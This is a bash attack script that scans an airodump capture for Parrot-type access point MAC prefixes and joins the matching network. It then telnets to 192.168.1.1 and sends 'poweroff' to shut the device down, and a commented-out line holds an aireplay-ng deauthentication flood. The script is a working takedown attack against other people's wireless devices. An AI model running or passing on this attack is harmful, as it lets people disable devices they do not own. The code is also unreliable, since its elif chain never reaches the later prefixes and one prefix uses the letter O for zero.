#!/bin/bash

pkill xterm
pkill airodump
apMAC=$(grep -m 1 -Eo "12:0F:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)

if [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "90:03:B7:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)


elif [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "A0:14:3D:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)


elif [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "00:26:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)


elif [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "00:12:1C:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)


elif [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "90:3A:E6:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)


elif [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "72:05:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)


elif [[ $apMAC == "" ]]; then
apMAC=$(grep -m 1 -Eo "OA:OF:7E:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" dump-01.csv)
fi

##apMAC="0A:0F:7E:50:04:E7"

apCh=$(grep -m 1 -E $apMAC dump-01.csv | cut -d "," -f 4)
apName=$(grep -m 1 -E $apMAC dump-01.csv | cut -d "," -f 14)

echo $apCh && echo $apName
sudo ifconfig wlan0 up
sudo iwconfig wlan0 channel $apCh
nmcli dev wifi connect $apName
#sudo xterm -hold -e aireplay-ng -0 0 -a $apMAC wlan0
(echo open "192.168.1.1"
echo "poweroff") | telnet


#12:0F:7E - Parrot MAC
